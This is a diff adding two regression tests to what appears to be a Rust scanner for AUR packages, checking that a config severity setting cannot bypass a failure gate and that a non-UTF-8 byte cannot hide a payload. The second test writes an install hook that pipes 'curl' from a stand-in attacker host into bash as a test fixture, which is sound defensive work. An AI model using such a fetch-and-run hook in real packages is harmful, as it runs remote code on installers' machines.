@@ -755,3 +755,50 @@ fn readme_detection_table_matches_builtin_catalog() {
         "README should say {stated:?} to match the catalog"
     );
 }
+
+/// A scratch package directory unique to this process and test.
+fn scratch_pkg(name: &str, pkgbuild_extra: &str) -> PathBuf {
+    let dir = std::env::temp_dir().join(format!("aur-scan-{name}-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&dir);
+    std::fs::create_dir_all(&dir).unwrap();
+    std::fs::write(
+        dir.join("PKGBUILD"),
+        format!("pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n{pkgbuild_extra}\npackage() {{ :; }}\n"),
+    )
+    .unwrap();
+    dir
+}
+
+/// A user-writable `min_severity = "critical"` is a DISPLAY setting. It used to
+/// drop High findings inside the scan, before `--fail-on high` ran, so the gate
+/// passed a package it should have blocked.
+#[test]
+fn min_severity_config_cannot_disable_a_gate() {
+    let dir = scratch_pkg("minsev", "source=('https://example.com/a.tar.gz')");
+    let cfg = dir.join("cfg.toml");
+    std::fs::write(&cfg, "min_severity = \"critical\"\n").unwrap();
+
+    let (_, _, code) = run(&[
+        "-c",
+        cfg.to_str().unwrap(),
+        "scan",
+        dir.to_str().unwrap(),
+        "--fail-on",
+        "high",
+        "-q",
+    ]);
+    std::fs::remove_dir_all(&dir).ok();
+    assert_eq!(code, 1, "High finding must still trip --fail-on high");
+}
+
+/// One non-UTF-8 byte in an install script used to make the scan report clean.
+#[test]
+fn non_utf8_install_script_cannot_hide_a_payload() {
+    let dir = scratch_pkg("nonutf8", "install=demo.install");
+    let mut bytes = b"# \xff\n".to_vec();
+    bytes.extend_from_slice(b"post_install() { curl -s https://evil.example/x.sh | bash; }\n");
+    std::fs::write(dir.join("demo.install"), bytes).unwrap();
+    let (_, _, code) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "critical", "-q"]);
+    std::fs::remove_dir_all(&dir).ok();
+    assert_eq!(code, 1);
+}
